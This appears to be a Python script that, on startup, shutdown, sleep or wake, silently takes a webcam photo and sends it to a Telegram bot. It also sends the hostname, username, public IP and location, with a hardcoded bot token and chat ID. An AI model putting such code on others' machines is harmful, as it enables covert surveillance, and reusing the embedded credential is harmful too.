import os
import sys
import platform
import socket
import getpass
from datetime import datetime, timedelta
import requests
import time
import json

try:
    import cv2
except ImportError:
    print("OpenCV not installed. Run: python -m pip install opencv-python")
    sys.exit(1)

try:
    import psutil
except ImportError:
    print("psutil not installed. Run: python -m pip install psutil")
    sys.exit(1)

# ---------------------------
TOKEN = "8375011972:AAF5NvgWpB_ERP1hqjmcrUpoMz3q8pd5JO4"
CHAT_ID = "5846327099"
CACHE_FILE = os.path.join(os.getenv("TEMP"), "pc_notifications.json")
# ---------------------------

# ---------------------------
# Helper Functions
# ---------------------------

def get_network_type():
    stats = psutil.net_if_stats()
    for iface, info in stats.items():
        if info.isup:
            iface_lower = iface.lower()
            if "wi-fi" in iface_lower or "wlan" in iface_lower:
                return "Wi-Fi"
            elif "ethernet" in iface_lower or "eth" in iface_lower:
                return "Ethernet"
    return "Disconnected"

def is_internet_available():
    try:
        requests.get("https://api.telegram.org", timeout=5)
        return True
    except:
        return False

def get_public_ip():
    try:
        r = requests.get("https://ipinfo.io/json", timeout=5)
        data = r.json()
        ip = data.get("ip", "Unknown")
        city = data.get("city", "")
        region = data.get("region", "")
        country = data.get("country", "")
        location = f"{city}, {region}, {country}".strip(", ")
        return ip, location
    except Exception:
        return "Unknown", "Unknown"

def get_battery_status():
    if hasattr(psutil, "sensors_battery"):
        battery = psutil.sensors_battery()
        if battery:
            percent = battery.percent
            charging = battery.power_plugged
            if percent > 80:
                icon = "🔋"
            elif percent > 30:
                icon = "⚡"
            else:
                icon = "❌"
            status = "🔌 Charging" if charging else "Not Charging"
            if percent < 20 and not charging:
                status += " ⚠️ Low Battery!"
            return f"{icon} {percent}% ({status})"
    return "No Battery Info"

def get_resource_status():
    cpu = psutil.cpu_percent()
    ram = psutil.virtual_memory().percent
    status = []
    if cpu > 90:
        status.append(f"⚠️ CPU {cpu}%")
    if ram > 90:
        status.append(f"⚠️ RAM {ram}%")
    return " | ".join(status) if status else "✅ CPU/RAM Normal"

# ---------------------------
# Message Builder (Updated with Uptime)
# ---------------------------

def build_message(event: str):
    now = datetime.now()
    time_str = now.strftime("%I:%M:%S %p")
    date_str = now.strftime("%Y-%m-%d")
    hostname = socket.gethostname()
    user = getpass.getuser()
    system = platform.platform()
    network_type = get_network_type()
    ip, location = get_public_ip()
    battery = get_battery_status()
    resources = get_resource_status()

    # Uptime Calculation
    uptime_str = ""
    if event.lower() in ["shutdown", "sleep", "hibernate", "wakeup"]:
        boot_time = datetime.fromtimestamp(psutil.boot_time())
        uptime = now - boot_time
        uptime_str = f"`Uptime:` {str(timedelta(seconds=int(uptime.total_seconds())))}"

    # Headers & Status
    headers = {
        "startup/login": "🚀 PC Launched Successfully 🚀",
        "shutdown": "🛑 PC Shutdown Alert 🛑",
        "sleep": "💤 PC Sleeping 💤",
        "hibernate": "🌙 PC Hibernating 🌙",
        "wakeup": "🔔 PC Woke Up 🔔",
        "default": "💻 PC Notification 💻"
    }
    header = headers.get(event.lower(), headers["default"])

    status_lines = {
        "startup/login": "✅ PC is active and ready!",
        "shutdown": "⚠️ PC has been safely turned off.",
        "sleep": "💤 Sleep mode ON. Scheduled wake-up.",
        "hibernate": "🌙 Hibernate mode ON. Energy saving.",
        "wakeup": "🔔 PC awake and operational.",
        "default": "ℹ️ Event recorded."
    }
    status = status_lines.get(event.lower(), status_lines["default"])

    net_icon = "🌐" if network_type != "Disconnected" else "⚠️"

    message = (
        f"*{header}*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💡 *Quick Summary*\n"
        f"• {net_icon} Network: `{network_type}`\n"
        f"• 🔋 Battery: `{battery}`\n"
        f"• 🌍 IP: `{ip}` | Location: `{location}`\n"
        f"• 🕒 Time: `{time_str}` | 📅 Date: `{date_str}`\n\n"
        f"💻 *System Info*\n"
        f"• 🖥 Hostname: `{hostname}`\n"
        f"• 👤 User: `{user}`\n"
        f"• 🛠 OS: `{system}`\n\n"
        f"⚡ *Resource Status*\n"
        f"• {resources}\n\n"
        f"✨ *Smart Status*\n"
        f"• {status}\n"
        f"{uptime_str}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )
    return message

# ---------------------------
# Send & Cache Functions
# ---------------------------

def save_offline(event, message, img_path):
    data = {"event": event, "message": message, "image": img_path}
    if os.path.exists(CACHE_FILE):
        with open(CACHE_FILE, "r") as f:
            cache = json.load(f)
    else:
        cache = []
    cache.append(data)
    with open(CACHE_FILE, "w") as f:
        json.dump(cache, f)

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try:
        requests.post(
            url, 
            data={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"},
            timeout=5
        )
        return True
    except:
        return False

def send_telegram_photo(img_path, caption):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    try:
        with open(img_path, "rb") as img_file:
            requests.post(
                url,
                data={"chat_id": CHAT_ID, "caption": caption},
                files={"photo": img_file},
                timeout=5
            )
        return True
    except:
        return False

def capture_photo(event):
    cap = cv2.VideoCapture(0)
    img_path = None
    if cap.isOpened():
        for _ in range(5):
            cap.read()
            time.sleep(0.1)
        ret, frame = cap.read()
        cap.release()
        if ret:
            img_path = os.path.join(os.getenv("TEMP"), f"pc_photo_{int(time.time())}.jpg")
            cv2.putText(
                frame,
                datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                (10, 30),
                cv2.FONT_HERSHEY_SIMPLEX,
                0.7,
                (0, 255, 0),
                2
            )
            cv2.imwrite(img_path, frame)
    return img_path

def process_offline_cache():
    if not os.path.exists(CACHE_FILE):
        return
    if not is_internet_available():
        return
    with open(CACHE_FILE, "r") as f:
        cache = json.load(f)
    for item in cache:
        send_telegram_message(item["message"])
        if item["image"] and os.path.exists(item["image"]):
            send_telegram_photo(item["image"], f"📸 {item['event']} Snapshot")
            os.remove(item["image"])
    os.remove(CACHE_FILE)

# ---------------------------
# Main
# ---------------------------

def main():
    event_name = sys.argv[1] if len(sys.argv) > 1 else "Startup/Login"
    message = build_message(event_name)
    img_path = capture_photo(event_name)

    if is_internet_available():
        send_telegram_message(message)
        if img_path:
            send_telegram_photo(img_path, f"📸 {event_name} Snapshot")
            os.remove(img_path)
    else:
        save_offline(event_name, message, img_path)

    # Try to process any pending messages
    process_offline_cache()

if __name__ == "__main__":
    main()
